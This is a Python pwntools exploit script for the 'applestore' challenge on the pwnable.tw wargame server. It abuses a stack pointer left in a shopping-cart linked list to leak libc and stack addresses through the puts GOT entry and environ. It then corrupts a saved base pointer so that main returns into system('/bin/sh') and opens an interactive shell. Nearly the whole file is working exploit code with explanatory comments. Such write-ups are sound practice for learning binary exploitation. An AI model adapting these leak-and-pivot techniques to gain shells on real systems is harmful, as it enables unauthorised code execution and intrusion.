#!/usr/bin/env python3

from pwn import *

exe = ELF("./applestore_patched")
libc = ELF("./libc_32.so.6", checksec = False)
ld = ELF("./ld-2.23.so", checksec = False)

context.binary = exe
cart_size = 0

gdbscript = """
                break *delete+100
            """


def conn():
    global r

    if args.LOCAL:
        r = process([exe.path])
        if args.DDEBUG:
            gdb.attach(r, gdbscript)
    else:
        r = remote("chall.pwnable.tw", 10104)

    return r


def add(index: int):
    global cart_size
    
    r.sendlineafter(b"> ", b"2")
    r.sendafter(b"> ", str(index).encode("ascii"))
    cart_size += 1


def delete(data: bytes):
    global cart_size
    
    r.sendlineafter(b"> ", b"3")
    r.sendafter(b"> ", data)
    cart_size -= 1


def cart(index: int):
    global cart_size

    r.sendlineafter(b"> ", b"4")
    r.sendlineafter(b"> ", b"y")
    r.recvlines(cart_size)


def checkout():
    global cart_size

    r.sendlineafter(b"> ", b"5")
    r.sendlineafter(b"> ", b"y")
    r.recvlines(cart_size)
    cart_size += 1


def main():
    r = conn()

    # Pass `checkout()` check by adding items whose total is 7174$
    for _ in range(15): add(1)
    for _ in range(5):  add(2)
    for _ in range(3):  add(3)
    for _ in range(3):  add(4)

    # Program saves pointer to stack into *chunk+12 (next item) once it inserts the extra item.
    # This is due to the program not calling `create()` to make a correct item.
    # `create()` function set to zero the next pointer; not calling that function makes the
    # program save the address of a stack variable to *chunk+12.
    # Moreover, the stack layout for `delete()` overlaps the stack layout of `insert()` called
    # inside `checkout()`, more precisely the "next item" stack variable is after the "item number"
    # variable in `delete()`.
    # Thus we can input the index for extra item and concatenate any address to leak it through `printf()`.

    checkout()

    # Leak libc through `puts()` GOT
    delete(b"27" + p32(exe.got.puts))
    r.recvuntil(b"Remove 27:")
    libc.address = u32(r.recv(4)) - libc.sym.puts
    log.info(f"libc @ 0x{libc.address:x}")

    # Leak `handler()` stack address where our input is placed, through "environ" in libc
    delete(b"27" + p32(libc.sym.environ))
    r.recvuntil(b"Remove 27:")
    esp = u32(r.recv(4)) - 0xe4
    log.info(f"esp @ 0x{esp:x}")

    # Consequentially, we can calculate the base pointer of `main()`
    ebp = esp + 0x20
    log.info(f"ebp @ 0x{ebp:x}")

    # Now we can overwrite `handler()` $ebp so that, once the "leave" instruction is executed,
    # its $ebp will point exactly to our input.
    # Thus, once `main()` leaves, it will return back to our input and execute `system()`
    '''
       [...]
       0x08048a13 <+122>:   je     0x8048a1e <delete+133>
       0x08048a15 <+124>:   mov    eax,DWORD PTR [ebp-0x28]
       0x08048a18 <+127>:   mov    edx,DWORD PTR [ebp-0x2c]
       0x08048a1b <+130>:   mov    DWORD PTR [eax+0x8],edx
       0x08048a1e <+133>:   cmp    DWORD PTR [ebp-0x2c],0x0
       0x08048a22 <+137>:   je     0x8048a2d <delete+148>
       0x08048a24 <+139>:   mov    eax,DWORD PTR [ebp-0x2c]
       0x08048a27 <+142>:   mov    edx,DWORD PTR [ebp-0x28]
       0x08048a2a <+145>:   mov    DWORD PTR [eax+0xc],edx
       [...]
    '''

    # NOTE: `puts()` GOT (or any dereferentiable address) is necessary otherwise `vsprintf()` would crash
    payload = flat(
                    exe.got.puts,
                    b"AAAA",
                    esp,
                    ebp - 0x8
                )

    delete(b"27" + payload)

    # Now we inject our input so that `main()` "leaves" to that
    payload = flat(
                    b"AAAA",        # fake ebp for `system()`
                    libc.sym.system,
                    b"BBBB",        # fake return address
                    next(libc.search(b"/bin/sh\x00"))
                )

    r.sendafter(b"> ", b"06" + payload)     # exit to trigger the payload

    r.clean(1)
    r.interactive("$ ")


if __name__ == "__main__":
    main()
